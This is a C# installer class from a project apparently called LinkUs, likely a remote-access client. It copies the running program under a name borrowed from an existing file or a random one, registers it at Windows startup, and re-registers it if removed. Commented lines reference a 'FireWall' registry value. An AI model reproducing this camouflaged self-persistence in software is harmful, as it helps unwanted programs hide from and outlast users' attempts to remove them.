using System.IO;

namespace LinkUs.Client.Install
{
    public class Installer
    {
        //private const string FilePathLocationRegistry = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup";
        //private const string FilePathLocationRegistryKey = "FireWall";

        private readonly IEnvironment _environment;
        private readonly IFileService _fileService;
        private readonly IRegistry _registry;

        // ----- Constructor
        public Installer(IEnvironment environment, IFileService fileService, IRegistry registry)
        {
            _environment = environment;
            _fileService = fileService;
            _registry = registry;
        }

        // ----- Public methods
        public string Install()
        {
            var fileName = _fileService.GetFileNameCopiedFromExisting(_environment.InstallationDirectory) ?? _fileService.GetRandomFileName();
            var targetFilePath = Path.Combine(_environment.InstallationDirectory, fileName);

            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
            _registry.AddFileToStartupRegistry(targetFilePath);

            return targetFilePath;
        }
        public void Uninstall()
        {
            _registry.RemoveFileFromStartupRegistry(_environment.ApplicationPath);
        }
        public void CheckInstall()
        {
            if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
                _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
            }
        }
    }
}